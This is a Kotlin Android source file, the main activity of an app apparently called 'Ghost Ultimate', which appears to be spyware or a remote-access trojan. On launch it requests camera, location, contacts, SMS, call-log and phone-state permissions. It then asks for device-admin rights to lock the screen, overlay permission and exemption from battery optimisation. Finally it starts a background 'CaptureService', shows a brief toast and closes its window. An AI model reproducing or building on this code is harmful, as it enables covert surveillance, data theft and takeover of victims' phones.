package com.ghost.app
import android.Manifest
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.PowerManager
import android.provider.Settings
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
class MainActivity : AppCompatActivity() {
    private val REQ = 1001
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        val perms = mutableListOf(
            Manifest.permission.CAMERA, Manifest.permission.ACCESS_FINE_LOCATION, Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.READ_CONTACTS, Manifest.permission.READ_SMS, Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_PHONE_STATE, Manifest.permission.READ_PHONE_NUMBERS
        )
        if (Build.VERSION.SDK_INT >= 33) perms.add(Manifest.permission.POST_NOTIFICATIONS)
        if (Build.VERSION.SDK_INT <= 32) perms.add(Manifest.permission.READ_EXTERNAL_STORAGE)
        
        val missing = perms.filter { ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED }
        if (missing.isEmpty()) { 
            setupPermissions()
            startSvc()
            Toast.makeText(this, "Ghost Ultimate Aktif!", Toast.LENGTH_SHORT).show()
            finish() 
        } else { 
            ActivityCompat.requestPermissions(this, missing.toTypedArray(), REQ) 
        }
    }
    override fun onRequestPermissionsResult(r: Int, p: Array<out String>, g: IntArray) {
        super.onRequestPermissionsResult(r, p, g)
        setupPermissions()
        startSvc()
        finish()
    }
    private fun setupPermissions() {
        if (!Settings.canDrawOverlays(this)) {
            startActivity(Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:$packageName")))
        }
        val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        if (!dpm.isAdminActive(ComponentName(this, AdminReceiver::class.java))) {
            startActivity(Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
                putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, ComponentName(this@MainActivity, AdminReceiver::class.java))
                putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Izinkan kunci layar.")
            })
        }
        val pm = getSystemService(POWER_SERVICE) as PowerManager
        if (!pm.isIgnoringBatteryOptimizations(packageName)) {
            startActivity(Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply { data = Uri.parse("package:$packageName") })
        }
    }
    private fun startSvc() {
        val i = Intent(this, CaptureService::class.java)
        if (Build.VERSION.SDK_INT >= 26) startForegroundService(i) else startService(i)
    }
}
